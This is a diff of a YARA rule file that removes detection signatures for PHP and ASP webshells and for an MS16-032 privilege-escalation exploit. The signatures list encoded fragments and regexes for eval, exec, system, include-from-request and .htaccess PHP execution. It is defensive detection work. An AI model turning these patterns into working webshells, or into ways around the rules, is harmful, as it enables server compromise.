-      $x1 = "[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($Thread)))" ascii
-      $x2 = "0x00000002, \"C:\\Windows\\System32\\cmd.exe\", \"\"," fullword ascii
-      $x3 = "PowerShell implementation of MS16-032. The exploit targets all vulnerable" fullword ascii
-      $x4 = "If we can't open the process token it's a SYSTEM shell!" fullword ascii
-   condition:
-      ( filesize < 40KB and 1 of them )
 }
 
 rule APT_MAL_DTRACK_Oct19_1 {
@@ -13054,4788 +17972,6 @@ rule SUSP_MalDoc_ExcelMacro {
     uint16(0) == 0x4b50 and
     filesize < 2000KB and
     $artifact1 and $macro and $import1 and 1 of ($url*)
-}
-
-rule WEBSHELL_PHP_Base64_Encoded_Payloads : FILE {
-    meta:
-        description = "php webshell containing base64 encoded payload"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/07"
-        modified = "2023-04-05"
-        hash = "88d0d4696c9cb2d37d16e330e236cb37cfaec4cd"
-        hash = "e3b4e5ec29628791f836e15500f6fdea19beaf3e8d9981c50714656c50d3b365"
-        hash = "e726cd071915534761822805724c6c6bfe0fcac604a86f09437f03f301512dc5"
-        hash = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
-        hash = "8cc9802769ede56f1139abeaa0735526f781dff3b6c6334795d1d0f19161d076"
-        hash = "4cda0c798908b61ae7f4146c6218d7b7de14cbcd7c839edbdeb547b5ae404cd4"
-        hash = "afd9c9b0df0b2ca119914ea0008fad94de3bd93c6919f226b793464d4441bdf4"
-        hash = "b2048dc30fc7681094a0306a81f4a4cc34f0b35ccce1258c20f4940300397819"
-        hash = "da6af9a4a60e3a484764010fbf1a547c2c0a2791e03fc11618b8fc2605dceb04"
-        hash = "222cd9b208bd24955bcf4f9976f9c14c1d25e29d361d9dcd603d57f1ea2b0aee"
-        hash = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
-        hash = "6b6cd1ef7e78e37cbcca94bfb5f49f763ba2f63ed8b33bc4d7f9e5314c87f646"
-        hash = "51c2c8b94c4b8cce806735bcf6e5aa3f168f0f7addce47b699b9a4e31dc71b47"
-        hash = "7a16311a371f03b29d5220484e7ecbe841cfaead4e73c17aa6a9c23b5d94544d"
-        hash = "e2b1dfcfaa61e92526a3a444be6c65330a8db4e692543a421e19711760f6ffe2"
-
-        id = "4e42b47d-725b-5e1f-9408-6c6329f60506"
-    strings:
-        $decode1 = "base64_decode" fullword nocase wide ascii
-        $decode2 = "openssl_decrypt" fullword nocase wide ascii
-        // exec
-        $one1 = "leGVj"
-        $one2 = "V4ZW"
-        $one3 = "ZXhlY"
-        $one4 = "UAeABlAGMA"
-        $one5 = "lAHgAZQBjA"
-        $one6 = "ZQB4AGUAYw"
-        // shell_exec
-        $two1 = "zaGVsbF9leGVj"
-        $two2 = "NoZWxsX2V4ZW"
-        $two3 = "c2hlbGxfZXhlY"
-        $two4 = "MAaABlAGwAbABfAGUAeABlAGMA"
-        $two5 = "zAGgAZQBsAGwAXwBlAHgAZQBjA"
-        $two6 = "cwBoAGUAbABsAF8AZQB4AGUAYw"
-        // passthru
-        $three1 = "wYXNzdGhyd"
-        $three2 = "Bhc3N0aHJ1"
-        $three3 = "cGFzc3Rocn"
-        $three4 = "AAYQBzAHMAdABoAHIAdQ"
-        $three5 = "wAGEAcwBzAHQAaAByAHUA"
-        $three6 = "cABhAHMAcwB0AGgAcgB1A"
-        // system
-        $four1 = "zeXN0ZW"
-        $four2 = "N5c3Rlb"
-        $four3 = "c3lzdGVt"
-        $four4 = "MAeQBzAHQAZQBtA"
-        $four5 = "zAHkAcwB0AGUAbQ"
-        $four6 = "cwB5AHMAdABlAG0A"
-        // popen
-        $five1 = "wb3Blb"
-        $five2 = "BvcGVu"
-        $five3 = "cG9wZW"
-        $five4 = "AAbwBwAGUAbg"
-        $five5 = "wAG8AcABlAG4A"
-        $five6 = "cABvAHAAZQBuA"
-        // proc_open
-        $six1 = "wcm9jX29wZW"
-        $six2 = "Byb2Nfb3Blb"
-        $six3 = "cHJvY19vcGVu"
-        $six4 = "AAcgBvAGMAXwBvAHAAZQBuA"
-        $six5 = "wAHIAbwBjAF8AbwBwAGUAbg"
-        $six6 = "cAByAG8AYwBfAG8AcABlAG4A"
-        // pcntl_exec
-        $seven1 = "wY250bF9leGVj"
-        $seven2 = "BjbnRsX2V4ZW"
-        $seven3 = "cGNudGxfZXhlY"
-        $seven4 = "AAYwBuAHQAbABfAGUAeABlAGMA"
-        $seven5 = "wAGMAbgB0AGwAXwBlAHgAZQBjA"
-        $seven6 = "cABjAG4AdABsAF8AZQB4AGUAYw"
-        // eval
-        $eight1 = "ldmFs"
-        $eight2 = "V2YW"
-        $eight3 = "ZXZhb"
-        $eight4 = "UAdgBhAGwA"
-        $eight5 = "lAHYAYQBsA"
-        $eight6 = "ZQB2AGEAbA"
-        // assert
-        $nine1 = "hc3Nlcn"
-        $nine2 = "Fzc2Vyd"
-        $nine3 = "YXNzZXJ0"
-        $nine4 = "EAcwBzAGUAcgB0A"
-        $nine5 = "hAHMAcwBlAHIAdA"
-        $nine6 = "YQBzAHMAZQByAHQA"
-
-        // false positives
-
-        // execu
-        $execu1 = "leGVjd"
-        $execu2 = "V4ZWN1"
-        $execu3 = "ZXhlY3"
-
-        // esystem like e.g. filesystem
-        $esystem1 = "lc3lzdGVt"
-        $esystem2 = "VzeXN0ZW"
-        $esystem3 = "ZXN5c3Rlb"
-
-        // opening
-        $opening1 = "vcGVuaW5n"
-        $opening2 = "9wZW5pbm"
-        $opening3 = "b3BlbmluZ"
-
-        // false positives
-        $fp1 = { D0 CF 11 E0 A1 B1 1A E1 }
-        // api.telegram
-        $fp2 = "YXBpLnRlbGVncmFtLm9"
-        // Log files
-        $fp3 = " GET /"
-        $fp4 = " POST /"
-
-    $fpa1 = "/cn=Recipients"
-
-        //strings from private rule capa_php_old_safe
-        $php_short = "<?" wide ascii
-        // prevent xml and asp from hitting with the short tag
-        $no_xml1 = "<?xml version" nocase wide ascii
-        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
-        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
-        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
-        $no_pdf = "<?xpacket"
-
-        // of course the new tags should also match
-        // already matched by "<?"
-        $php_new1 = /<\?=[^?]/ wide ascii
-        $php_new2 = "<?php" nocase wide ascii
-        $php_new3 = "<script language=\"php" nocase wide ascii
-
-    condition:
-        filesize < 300KB and (
-            (
-                (
-                        $php_short in (0..100) or
-                        $php_short in (filesize-1000..filesize)
-                )
-                and not any of ( $no_* )
-            )
-            or any of ( $php_new* )
-        )
-        and not any of ( $fp* ) and any of ( $decode* ) and
-        ( ( any of ( $one* ) and not any of ( $execu* ) ) or any of ( $two* ) or any of ( $three* ) or
-        ( any of ( $four* ) and not any of ( $esystem* ) ) or
-        ( any of ( $five* ) and not any of ( $opening* ) ) or any of ( $six* ) or any of ( $seven* ) or any of ( $eight* ) or any of ( $nine* ) )
-}
-
-rule WEBSHELL_PHP_Unknown_1
-{
-    meta:
-        description = "obfuscated php webshell"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        hash = "12ce6c7167b33cc4e8bdec29fb1cfc44ac9487d1"
-        hash = "cf4abbd568ce0c0dfce1f2e4af669ad2"
-        date = "2021/01/07"
-        modified = "2023-04-05"
-
-        id = "93d01a4c-4c18-55d2-b682-68a1f6460889"
-    strings:
-        $sp0 = /^<\?php \$[a-z]{3,30} = '/ wide ascii
-        $sp1 = "=explode(chr(" wide ascii
-        $sp2 = "; if (!function_exists('" wide ascii
-        $sp3 = " = NULL; for(" wide ascii
-
-    condition:
-        filesize <300KB and all of ($sp*)
-}
-
-rule WEBSHELL_PHP_Double_Eval_Tiny
-{
-    meta:
-        description = "PHP webshell which probably hides the input inside an eval()ed obfuscated string"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021-01-11"
-        modified = "2023-07-05"
-        hash = "f66fb918751acc7b88a17272a044b5242797976c73a6e54ac6b04b02f61e9761"
-        hash = "6b2f0a3bd80019dea536ddbf92df36ab897dd295840cb15bb7b159d0ee2106ff"
-        hash = "aabfd179aaf716929c8b820eefa3c1f613f8dcac"
-        hash = "9780c70bd1c76425d4313ca7a9b89dda77d2c664"
-        hash = "006620d2a701de73d995fc950691665c0692af11"
-
-
-        id = "868db363-83d3-57e2-ac8d-c6125e9bdd64"
-    strings:
-        $payload = /(\beval[\t ]{0,500}\([^)]|\bassert[\t ]{0,500}\([^)])/ nocase wide ascii
-        $fp1 = "clone" fullword wide ascii
-        $fp2 = "* @assert" ascii
-        $fp3 = "*@assert" ascii
-
-        //strings from private rule capa_php_old_safe
-        $php_short = "<?" wide ascii
-        // prevent xml and asp from hitting with the short tag
-        $no_xml1 = "<?xml version" nocase wide ascii
-        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
-        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
-        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
-        $no_pdf = "<?xpacket"
-
-        // of course the new tags should also match
-        // already matched by "<?"
-        $php_new1 = /<\?=[^?]/ wide ascii
-        $php_new2 = "<?php" nocase wide ascii
-        $php_new3 = "<script language=\"php" nocase wide ascii
-
-    condition:
-        filesize > 70 and filesize < 300 and (
-            (
-                (
-                        $php_short in (0..100) or
-                        $php_short in (filesize-1000..filesize)
-                )
-                and not any of ( $no_* )
-            )
-            or any of ( $php_new* )
-        )
-        and #payload >= 2 and not any of ( $fp* )
-}
-
-rule WEBSHELL_PHP_OBFUSC_Encoded
-{
-    meta:
-        description = "PHP webshell obfuscated by encoding"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        date = "2021/04/18"
-        modified = "2023-04-05"
-        score = 70
-        hash = "119fc058c9c5285498a47aa271ac9a27f6ada1bf4d854ccd4b01db993d61fc52"
-        hash = "d5ca3e4505ea122019ea263d6433221030b3f64460d3ce2c7d0d63ed91162175"
-        hash = "8a1e2d72c82f6a846ec066d249bfa0aaf392c65149d39b7b15ba19f9adc3b339"
-
-
-        id = "134c1189-1b41-58d5-af66-beaa4795a704"
-    strings:
-        // one without plain e, one without plain v, to avoid hitting on plain "eval("
-        $enc_eval1 = /(e|\\x65|\\101)(\\x76|\\118)(a|\\x61|\\97)(l|\\x6c|\\108)(\(|\\x28|\\40)/ wide ascii nocase
-        $enc_eval2 = /(\\x65|\\101)(v|\\x76|\\118)(a|\\x61|\\97)(l|\\x6c|\\108)(\(|\\x28|\\40)/ wide ascii nocase
-        // one without plain a, one without plain s, to avoid hitting on plain "assert("
-        $enc_assert1 = /(a|\\97|\\x61)(\\115|\\x73)(s|\\115|\\x73)(e|\\101|\\x65)(r|\\114|\\x72)(t|\\116|\\x74)(\(|\\x28|\\40)/ wide ascii nocase
-        $enc_assert2 = /(\\97|\\x61)(s|\\115|\\x73)(s|\\115|\\x73)(e|\\101|\\x65)(r|\\114|\\x72)(t|\\116|\\x74)(\(|\\x28|\\40)/ wide ascii nocase
-
-        //strings from private rule capa_php_old_safe
-        $php_short = "<?" wide ascii
-        // prevent xml and asp from hitting with the short tag
-        $no_xml1 = "<?xml version" nocase wide ascii
-        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
-        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
-        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
-        $no_pdf = "<?xpacket"
-
-        // of course the new tags should also match
-        // already matched by "<?"
-        $php_new1 = /<\?=[^?]/ wide ascii
-        $php_new2 = "<?php" nocase wide ascii
-        $php_new3 = "<script language=\"php" nocase wide ascii
-
-    condition:
-        filesize < 700KB and (
-            (
-                (
-                        $php_short in (0..100) or
-                        $php_short in (filesize-1000..filesize)
-                )
-                and not any of ( $no_* )
-            )
-            or any of ( $php_new* )
-        )
-        and any of ( $enc* )
-}
-
-rule WEBSHELL_PHP_OBFUSC_Encoded_Mixed_Dec_And_Hex
-{
-    meta:
-        description = "PHP webshell obfuscated by encoding of mixed hex and dec"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/04/18"
-        modified = "2023-04-05"
-        hash = "0e21931b16f30b1db90a27eafabccc91abd757fa63594ba8a6ad3f477de1ab1c"
-        hash = "929975272f0f42bf76469ed89ebf37efcbd91c6f8dac1129c7ab061e2564dd06"
-        hash = "88fce6c1b589d600b4295528d3fcac161b581f739095b99cd6c768b7e16e89ff"
-        hash = "883f48ed4e9646da078cabf6b8b4946d9f199660262502650f76450ecf60ddd5"
-        hash = "50389c3b95a9de00220fc554258fda1fef01c62dad849e66c8a92fc749523457"
-        hash = "c4ab4319a77b751a45391aa01cde2d765b095b0e3f6a92b0b8626d5c7e3ad603"
-        hash = "df381f04fca2522e2ecba0f5de3f73a655d1540e1cf865970f5fa3bf52d2b297"
-        hash = "401388d8b97649672d101bf55694dd175375214386253d0b4b8d8d801a89549c"
-        hash = "99fc39a12856cc1a42bb7f90ffc9fe0a5339838b54a63e8f00aa98961c900618"
-        hash = "fb031af7aa459ee88a9ca44013a76f6278ad5846aa20e5add4aeb5fab058d0ee"
-        hash = "dd5d8a9b4bb406e0b8f868165a1714fe54ffb18e621582210f96f6e5ae850b33"
-        hash = "0ff05e6695074f98b0dee6200697a997c509a652f746d2c1c92c0b0a0552ca47"
-
-        id = "9ae920e2-17c8-58fd-8566-90d461a54943"
-    strings:
-        // "e\x4a\x48\x5a\x70\x63\62\154\x30\131\171\101\x39\111\x43\x52\x66\x51\
-        //$mix = /['"]\\x?[0-9a-f]{2,3}[\\\w]{2,20}\\\d{1,3}[\\\w]{2,20}\\x[0-9a-f]{2}\\/ wide ascii nocase
-        $mix = /['"](\w|\\x?[0-9a-f]{2,3})[\\x0-9a-f]{2,20}\\\d{1,3}[\\x0-9a-f]{2,20}\\x[0-9a-f]{2}\\/ wide ascii nocase
-
-        //strings from private rule capa_php_old_safe
-        $php_short = "<?" wide ascii
-        // prevent xml and asp from hitting with the short tag
-        $no_xml1 = "<?xml version" nocase wide ascii
-        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
-        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
-        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
-        $no_pdf = "<?xpacket"
-
-        // of course the new tags should also match
-        // already matched by "<?"
-        $php_new1 = /<\?=[^?]/ wide ascii
-        $php_new2 = "<?php" nocase wide ascii
-        $php_new3 = "<script language=\"php" nocase wide ascii
-
-    condition:
-        filesize < 700KB and (
-            (
-                (
-                        $php_short in (0..100) or
-                        $php_short in (filesize-1000..filesize)
-                )
-                and not any of ( $no_* )
-            )
-            or any of ( $php_new* )
-        )
-        and any of ( $mix* )
-}
-
-rule WEBSHELL_PHP_OBFUSC_Str_Replace
-{
-    meta:
-        description = "PHP webshell which eval()s obfuscated string"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/12"
-        modified = "2023-04-05"
-        hash = "691305753e26884d0f930cda0fe5231c6437de94"
-        hash = "7efd463aeb5bf0120dc5f963b62463211bd9e678"
-        hash = "fb655ddb90892e522ae1aaaf6cd8bde27a7f49ef"
-        hash = "d1863aeca1a479462648d975773f795bb33a7af2"
-        hash = "4d31d94b88e2bbd255cf501e178944425d40ee97"
-        hash = "e1a2af3477d62a58f9e6431f5a4a123fb897ea80"
-
-        id = "1f5b93c9-bdeb-52c7-a99a-69869634a574"
-    strings:
-        $payload1 = "str_replace" fullword wide ascii
-        $payload2 = "function" fullword wide ascii
-        $goto = "goto" fullword wide ascii
-        //$hex  = "\\x"
-        $chr1  = "\\61" wide ascii
-        $chr2  = "\\112" wide ascii
-        $chr3  = "\\120" wide ascii
-
-        //strings from private rule capa_php_old_safe
-        $php_short = "<?" wide ascii
-        // prevent xml and asp from hitting with the short tag
-        $no_xml1 = "<?xml version" nocase wide ascii
-        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
-        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
-        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
-        $no_pdf = "<?xpacket"
-
-        // of course the new tags should also match
-        // already matched by "<?"
-        $php_new1 = /<\?=[^?]/ wide ascii
-        $php_new2 = "<?php" nocase wide ascii
-        $php_new3 = "<script language=\"php" nocase wide ascii
-
-    condition:
-        filesize < 300KB and (
-            (
-                (
-                        $php_short in (0..100) or
-                        $php_short in (filesize-1000..filesize)
-                )
-                and not any of ( $no_* )
-            )
-            or any of ( $php_new* )
-        )
-        and any of ( $payload* ) and #goto > 1 and
-        ( #chr1 > 10 or #chr2 > 10 or #chr3 > 10 )
-}
-
-rule WEBSHELL_PHP_OBFUSC_Fopo
-{
-    meta:
-        description = "PHP webshell which eval()s obfuscated string"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        hash = "fbcff8ea5ce04fc91c05384e847f2c316e013207"
-        hash = "6da57ad8be1c587bb5cc8a1413f07d10fb314b72"
-        hash = "a698441f817a9a72908a0d93a34133469f33a7b34972af3e351bdccae0737d99"
-        date = "2021/01/12"
-        modified = "2023-04-05"
-
-        id = "a298e99d-1ba8-58c8-afb9-fc988ea91e9a"
-    strings:
-        $payload = /(\beval[\t ]{0,500}\([^)]|\bassert[\t ]{0,500}\([^)])/ nocase wide ascii
-        // ;@eval(
-        $one1 = "7QGV2YWwo" wide ascii
-        $one2 = "tAZXZhbC" wide ascii
-        $one3 = "O0BldmFsK" wide ascii
-        $one4 = "sAQABlAHYAYQBsACgA" wide ascii
-        $one5 = "7AEAAZQB2AGEAbAAoA" wide ascii
-        $one6 = "OwBAAGUAdgBhAGwAKA" wide ascii
-        // ;@assert(
-        $two1 = "7QGFzc2VydC" wide ascii
-        $two2 = "tAYXNzZXJ0K" wide ascii
-        $two3 = "O0Bhc3NlcnQo" wide ascii
-        $two4 = "sAQABhAHMAcwBlAHIAdAAoA" wide ascii
-        $two5 = "7AEAAYQBzAHMAZQByAHQAKA" wide ascii
-        $two6 = "OwBAAGEAcwBzAGUAcgB0ACgA" wide ascii
-
-        //strings from private rule capa_php_old_safe
-        $php_short = "<?" wide ascii
-        // prevent xml and asp from hitting with the short tag
-        $no_xml1 = "<?xml version" nocase wide ascii
-        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
-        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
-        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
-        $no_pdf = "<?xpacket"
-
-        // of course the new tags should also match
-        // already matched by "<?"
-        $php_new1 = /<\?=[^?]/ wide ascii
-        $php_new2 = "<?php" nocase wide ascii
-        $php_new3 = "<script language=\"php" nocase wide ascii
-
-    condition:
-        filesize < 3000KB and (
-            (
-                (
-                        $php_short in (0..100) or
-                        $php_short in (filesize-1000..filesize)
-                )
-                and not any of ( $no_* )
-            )
-            or any of ( $php_new* )
-        )
-        and $payload and
-        ( any of ( $one* ) or any of ( $two* ) )
-}
-
-rule WEBSHELL_PHP_Includer_Eval
-{
-    meta:
-        description = "PHP webshell which eval()s another included file"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/13"
-        modified = "2023-04-05"
-        hash = "3a07e9188028efa32872ba5b6e5363920a6b2489"
-        hash = "ab771bb715710892b9513b1d075b4e2c0931afb6"
-        hash = "202dbcdc2896873631e1a0448098c820c82bcc8385a9f7579a0dc9702d76f580"
-        hash = "b51a6d208ec3a44a67cce16dcc1e93cdb06fe150acf16222815333ddf52d4db8"
-
-        id = "995fcc34-f91e-5c9c-97b1-84eed1714d40"
-    strings:
-        $payload1 = "eval" fullword wide ascii
-        $payload2 = "assert" fullword wide ascii
-        $include1 = "$_FILE" wide ascii
-        $include2 = "include" wide ascii
-
-        //strings from private rule capa_php_old_safe
-        $php_short = "<?" wide ascii
-        // prevent xml and asp from hitting with the short tag
-        $no_xml1 = "<?xml version" nocase wide ascii
-        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
-        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
-        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
-        $no_pdf = "<?xpacket"
-
-        // of course the new tags should also match
-        // already matched by "<?"
-        $php_new1 = /<\?=[^?]/ wide ascii
-        $php_new2 = "<?php" nocase wide ascii
-        $php_new3 = "<script language=\"php" nocase wide ascii
-
-    condition:
-        filesize < 200 and (
-            (
-                (
-                        $php_short in (0..100) or
-                        $php_short in (filesize-1000..filesize)
-                )
-                and not any of ( $no_* )
-            )
-            or any of ( $php_new* )
-        )
-        and 1 of ( $payload* ) and 1 of ( $include* )
-}
-
-rule WEBSHELL_PHP_Includer_Tiny
-{
-    meta:
-        description = "Suspicious: Might be PHP webshell includer, check the included file"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/04/17"
-        modified = "2023-07-05"
-        hash = "0687585025f99596508783b891e26d6989eec2ba"
-        hash = "9e856f5cb7cb901b5003e57c528a6298341d04dc"
-        hash = "b3b0274cda28292813096a5a7a3f5f77378b8905205bda7bb7e1a679a7845004"
-
-        id = "9bf96ddc-d984-57eb-9803-0b01890711b5"
-    strings:
-        $php_include1 = /include\(\$_(GET|POST|REQUEST)\[/ nocase wide ascii
-
-        //strings from private rule capa_php_old_safe
-        $php_short = "<?" wide ascii
-        // prevent xml and asp from hitting with the short tag
-        $no_xml1 = "<?xml version" nocase wide ascii
-        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
-        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
-        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
-        $no_pdf = "<?xpacket"
-
-        // of course the new tags should also match
-        // already matched by "<?"
-        $php_new1 = /<\?=[^?]/ wide ascii
-        $php_new2 = "<?php" nocase wide ascii
-        $php_new3 = "<script language=\"php" nocase wide ascii
-
-    condition:
-        filesize < 100 and (
-            (
-                (
-                        $php_short in (0..100) or
-                        $php_short in (filesize-1000..filesize)
-                )
-                and not any of ( $no_* )
-            )
-            or any of ( $php_new* )
-        )
-        and any of ( $php_include* )
-}
-
-rule WEBSHELL_PHP_Generic_Backticks_OBFUSC
-{
-    meta:
-        description = "Generic PHP webshell which uses backticks directly on user input"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/07"
-        modified = "2023-04-05"
-        hash = "23dc299f941d98c72bd48659cdb4673f5ba93697"
-        hash = "e3f393a1530a2824125ecdd6ac79d80cfb18fffb89f470d687323fb5dff0eec1"
-        hash = "1e75914336b1013cc30b24d76569542447833416516af0d237c599f95b593f9b"
-        hash = "8db86ad90883cd208cf86acd45e67c03f994998804441705d690cb6526614d00"
-
-        id = "5ecb329f-0755-536d-8bfa-e36158474a0b"
-    strings:
-        $s1 = /echo[\t ]{0,500}\(?`\$/ wide ascii
-
-        //strings from private rule capa_php_old_safe
-        $php_short = "<?" wide ascii
-        // prevent xml and asp from hitting with the short tag
-        $no_xml1 = "<?xml version" nocase wide ascii
-        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
-        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
-        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
-        $no_pdf = "<?xpacket"
-
-        // of course the new tags should also match
-        // already matched by "<?"
-        $php_new1 = /<\?=[^?]/ wide ascii
-        $php_new2 = "<?php" nocase wide ascii
-        $php_new3 = "<script language=\"php" nocase wide ascii
-
-    condition:
-        filesize < 500 and (
-            (
-                (
-                        $php_short in (0..100) or
-                        $php_short in (filesize-1000..filesize)
-                )
-                and not any of ( $no_* )
-            )
-            or any of ( $php_new* )
-        )
-        and $s1
-}
-
-rule WEBSHELL_PHP_In_Htaccess
-{
-    meta:
-        description = "Use Apache .htaccess to execute php code inside .htaccess"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/07"
-        modified = "2023-07-05"
-        hash = "c026d4512a32d93899d486c6f11d1e13b058a713"
-        hash = "d79e9b13a32a9e9f3fa36aa1a4baf444bfd2599a"
-        hash = "e1d1091fee6026829e037b2c70c228344955c263"
-        hash = "c026d4512a32d93899d486c6f11d1e13b058a713"
-        hash = "8c9e65cd3ef093cd9c5b418dc5116845aa6602bc92b9b5991b27344d8b3f7ef2"
-
-        id = "0f5edff9-22b2-50c9-ae81-72698ea8e7db"
-    strings:
-        $hta = "AddType application/x-httpd-php .htaccess" wide ascii
-
-    condition:
-        filesize <100KB and $hta
-}
-
-rule WEBSHELL_PHP_Writer
-{
-    meta:
-        description = "PHP webshell which only writes an uploaded file to disk"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        date = "2021/04/17"
-        modified = "2023-07-05"
-        score = 50
-        hash = "ec83d69512aa0cc85584973f5f0850932fb1949fb5fb2b7e6e5bbfb121193637"
-        hash = "407c15f94a33232c64ddf45f194917fabcd2e83cf93f38ee82f9720e2635fa64"
-        hash = "988b125b6727b94ce9a27ea42edc0ce282c5dfeb"
-        hash = "0ce760131787803bbef216d0ee9b5eb062633537"
-        hash = "20281d16838f707c86b1ff1428a293ed6aec0e97"
-
-        id = "05bb3e0c-69b2-5176-a3eb-e6ba2d72a205"
-    strings:
-        $sus3 = "'upload'" wide ascii
-        $sus4 = "\"upload\"" wide ascii
-        $sus5 = "\"Upload\"" wide ascii
-        $sus6 = "gif89" wide ascii
-        //$sus13= "<textarea " wide ascii
-        $sus16= "Army" fullword wide ascii
-        $sus17= "error_reporting( 0 )" wide ascii
-        $sus18= "' . '" wide ascii
-
-        //strings from private rule capa_php_old_safe
-        $php_short = "<?" wide ascii
-        // prevent xml and asp from hitting with the short tag
-        $no_xml1 = "<?xml version" nocase wide ascii
-        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
-        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
-        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
-        $no_pdf = "<?xpacket"
-
-        // of course the new tags should also match
-        // already matched by "<?"
-        $php_new1 = /<\?=[^?]/ wide ascii
-        $php_new2 = "<?php" nocase wide ascii
-        $php_new3 = "<script language=\"php" nocase wide ascii
-
-        //strings from private rule capa_php_input
-        $inp1 = "php://input" wide ascii
-        $inp2 = /_GET\s?\[/ wide ascii
-        // for passing $_GET to a function
-        $inp3 = /\(\s?\$_GET\s?\)/ wide ascii
-        $inp4 = /_POST\s?\[/ wide ascii
-        $inp5 = /\(\s?\$_POST\s?\)/ wide ascii
-        $inp6 = /_REQUEST\s?\[/ wide ascii
-        $inp7 = /\(\s?\$_REQUEST\s?\)/ wide ascii
-        // PHP automatically adds all the request headers into the $_SERVER global array, prefixing each header name by the "HTTP_" string, so e.g. @eval($_SERVER['HTTP_CMD']) will run any code in the HTTP header CMD
-        $inp15 = "_SERVER['HTTP_" wide ascii
-        $inp16 = "_SERVER[\"HTTP_" wide ascii
-        $inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ wide ascii
-        $inp18 = "array_values($_SERVER)" wide ascii
-        $inp19 = /file_get_contents\("https?:\/\// wide ascii
-
-        //strings from private rule capa_php_write_file
-        $php_multi_write1 = "fopen(" wide ascii
-        $php_multi_write2 = "fwrite(" wide ascii
-        $php_write1 = "move_uploaded_file" fullword wide ascii
-        $php_write2 = "copy" fullword wide ascii
-
-    condition:
-        //any of them or
-        (
-            (
-                (
-                        $php_short in (0..100) or
-                        $php_short in (filesize-1000..filesize)
-                )
-                and not any of ( $no_* )
-            )
-            or any of ( $php_new* )
-        )
-        and (
-            any of ( $inp* )
-        )
-        and (
-        any of ( $php_write* ) or
-        all of ( $php_multi_write* )
-        )
-        and
-        (
-            filesize < 400 or
-            (
-                filesize < 4000 and 1 of ( $sus* )
-            )
-        )
-}
-
-rule WEBSHELL_ASP_Writer
-{
-    meta:
-        description = "ASP webshell which only writes an uploaded file to disk"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        date = "2021/03/07"
-        modified = "2023-07-05"
-        score = 60
-        hash = "df6eaba8d643c49c6f38016531c88332e80af33c"
